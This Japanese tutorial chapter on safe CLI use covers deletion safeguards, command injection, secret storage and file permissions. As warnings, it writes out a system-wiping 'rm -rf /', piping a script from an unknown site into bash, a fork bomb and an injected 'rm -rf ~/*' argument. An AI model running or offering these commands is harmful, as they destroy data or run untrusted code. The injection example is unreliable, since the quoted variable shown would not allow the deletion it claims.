# 06. セキュリティ編 - 安全なCLI操作

## この章について

CLIは強力なツールですが、使い方を誤ると重大な問題を引き起こす可能性があります。この章では、安全にCLIを使うための知識とベストプラクティスを学びます。

### 学習目標

- 危険なコマンドの理解
- セキュアなスクリプト作成
- シークレット（認証情報）の安全な管理
- セキュリティベストプラクティス

---

## この章で学ぶこと

### 📘 [危険なコマンド](./dangerous-commands.md)
- 絶対に実行してはいけないコマンド
- 削除系コマンドの注意点
- 権限昇格（sudo, 管理者実行）のリスク
- コマンドインジェクション攻撃

### 📗 [シークレット管理](./secrets-management.md)
- パスワードをコマンドラインに含めない
- 環境変数の活用と危険性
- 認証情報の安全な保存
- .envファイルとgitignore

### 📕 [セキュアなスクリプティング](./secure-scripting.md)
- 入力検証の重要性
- パストラバーサル対策
- 安全な一時ファイル作成
- 権限の最小化原則

---

## 危険なコマンド集

### 🔴 絶対に実行してはいけないコマンド

#### 1. 「バルスコマンド」- システム全削除

**Linux/macOS**:
```bash
# 危険！実行禁止！
sudo rm -rf /
sudo rm -rf /*
```

**Windows PowerShell**:
```powershell
# 危険！実行禁止！
Remove-Item -Recurse -Force C:\
```

**何が起こるか**:
- すべてのファイルが強制削除される
- OSが起動不能になる
- データ復旧がほぼ不可能

#### 2. ランダムなスクリプトの実行

```bash
# 危険！
curl https://unknown-site.com/script.sh | bash
wget -qO- https://unknown-site.com/install.sh | sh
```

**リスク**:
- マルウェアのインストール
- データの窃取
- バックドアの設置

**安全な方法**:
```bash
# 1. まずダウンロードして内容を確認
curl -o script.sh https://known-site.com/script.sh
less script.sh  # 内容を確認

# 2. 安全を確認してから実行
chmod +x script.sh
./script.sh
```

#### 3. フォーク爆弾

```bash
# 危険！システムフリーズ
:(){ :|:& };:
```

**何が起こるか**:
- 無限にプロセスを生成
- システムリソースを食い尽くす
- システムが応答不能に

---

## 削除コマンドの安全な使い方

### 確認オプションを必ず使う

**Linux/macOS**:
```bash
# 悪い例
rm -rf important_folder

# 良い例：確認付き
rm -rfi important_folder

# さらに安全：まず内容確認
ls -la important_folder
# 問題なければ削除
rm -ri important_folder
```

**Windows PowerShell**:
```powershell
# 悪い例
Remove-Item -Recurse -Force important_folder

# 良い例：確認付き
Remove-Item -Recurse -Confirm important_folder

# さらに安全：WhatIfで予行演習
Remove-Item -Recurse -WhatIf important_folder
# 問題なければ実行
Remove-Item -Recurse -Confirm important_folder
```

### ワイルドカードの危険性

```bash
# 危険！意図しないファイルを削除
rm * .txt  # スペースのせいで「すべて + .txt」を削除

# 安全：まず確認
ls *.txt
# 問題なければ削除
rm -i *.txt
```

---

## コマンドインジェクション攻撃

### 脆弱なスクリプト例

**悪い例（bash）**:
```bash
#!/bin/bash
# ユーザー入力を直接使用（危険！）
filename="$1"
cat "$filename"
```

**攻撃例**:
```bash
# 意図的に悪意のある入力
./script.sh "file.txt; rm -rf ~/*"
# → file.txtを表示後、ホームディレクトリを削除！
```

### 安全なスクリプト

**良い例（bash）**:
```bash
#!/bin/bash
set -euo pipefail

filename="$1"

# 入力検証
if [[ ! "$filename" =~ ^[a-zA-Z0-9._-]+$ ]]; then
    echo "エラー: 無効なファイル名" >&2
    exit 1
fi

# ファイルの存在確認
if [ ! -f "$filename" ]; then
    echo "エラー: ファイルが見つかりません" >&2
    exit 1
fi

cat "$filename"
```

**良い例（PowerShell）**:
```powershell
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [ValidatePattern('^[a-zA-Z0-9._-]+$')]
    [string]$FileName
)

if (-not (Test-Path $FileName -PathType Leaf)) {
    Write-Error "ファイルが見つかりません"
    exit 1
}

Get-Content $FileName
```

---

## シークレット（認証情報）の安全な管理

### ❌ やってはいけないこと

```bash
# 悪い例1: コマンドラインにパスワード
mysql -u root -pMyPassword123

# 悪い例2: スクリプトにハードコード
#!/bin/bash
PASSWORD="MyPassword123"
curl -u user:$PASSWORD https://api.example.com

# 悪い例3: 履歴に残る
export DB_PASSWORD="MyPassword123"
```

**問題点**:
- コマンド履歴に残る（`history`で見える）
- プロセスリスト（`ps`）で見える
- Gitにコミットされる可能性

### ✅ 安全な方法

#### 1. 環境変数ファイルを使う

```bash
# .envファイル（Gitには含めない）
DB_PASSWORD=MySecretPassword
API_KEY=abc123xyz

# .gitignore に追加
echo ".env" >> .gitignore

# スクリプトで読み込み
source .env
mysql -u root -p"$DB_PASSWORD"
```

#### 2. パスワードを対話的に入力

```bash
# bashの場合
read -sp "パスワード: " PASSWORD
echo
mysql -u root -p"$PASSWORD"
```

```powershell
# PowerShellの場合
$Password = Read-Host "パスワード" -AsSecureString
$Credential = New-Object System.Management.Automation.PSCredential("user", $Password)
```

#### 3. 認証情報ストアを使う

```bash
# macOS: Keychain
security add-generic-password -a "user" -s "myapp" -w "password"
security find-generic-password -a "user" -s "myapp" -w

# Linux: pass（password-store）
pass insert myapp/password
pass show myapp/password

# Windows: Credential Manager
cmdkey /add:myapp /user:username /pass:password
```

---

## 権限管理のベストプラクティス

### 最小権限の原則

```bash
# 悪い例：すべてを root で実行
sudo bash script.sh

# 良い例：必要な部分だけ権限昇格
normal_command
sudo privileged_command
another_normal_command
```

### ファイルのパーミッション設定

```bash
# スクリプトファイル
chmod 750 script.sh  # 所有者: rwx, グループ: r-x, その他: ---

# 設定ファイル（秘密情報含む）
chmod 600 config.ini  # 所有者のみ: rw-, その他: ---

# 公開鍵
chmod 644 public.key  # 所有者: rw-, その他: r--

# 秘密鍵
chmod 600 private.key  # 所有者のみ: rw-
```

---

## セキュリティチェックリスト

### スクリプト作成時

- [ ] ユーザー入力を検証している
- [ ] パストラバーサルを防いでいる（`../`など）
- [ ] エラーメッセージに機密情報を含めていない
- [ ] 一時ファイルを安全に作成している（`mktemp`使用）
- [ ] 不要な権限で実行していない

### 認証情報管理

- [ ] パスワードをコマンドラインに含めていない
- [ ] 環境変数ファイル（.env）を.gitignoreに追加している
- [ ] スクリプトにパスワードをハードコードしていない
- [ ] 認証情報ファイルの権限を適切に設定している

### コマンド実行時

- [ ] 削除コマンドに`-i`や`-Confirm`を付けている
- [ ] ワイルドカードの展開結果を事前に確認している
- [ ] 信頼できないソースからのスクリプトを実行していない
- [ ] `sudo`/管理者権限を必要最小限にしている

---

## 緊急時の対処法

### 誤って重要なファイルを削除してしまった

```bash
# すぐにシステムを停止して書き込みを防ぐ
sudo shutdown -h now

# 専門のデータ復旧ツールを使用
# （通常のユーザーが復旧するのは困難）
```

### 不審なプロセスが動いている

```bash
# プロセス一覧を確認
ps aux | grep suspicious

# プロセスを終了
kill <PID>
# または強制終了
kill -9 <PID>

# ログを確認
sudo tail -f /var/log/syslog  # Linux
```

---

## まとめ

### 重要な原則

1. **疑わしいコマンドは実行しない**
2. **削除前に必ず確認する**
3. **認証情報をコマンドラインに含めない**
4. **ユーザー入力を検証する**
5. **最小権限の原則を守る**

> **セキュリティは一度の失敗で全てが台無しになります。
> 常に慎重に、確認してから実行しましょう。**

---

**前の章**: [05. ツール&ユーティリティ編](../05_ツール_ユーティリティ編/README.md)
**次の章**: [07. AI時代のCLI編](../07_AI時代のCLI編/README.md)
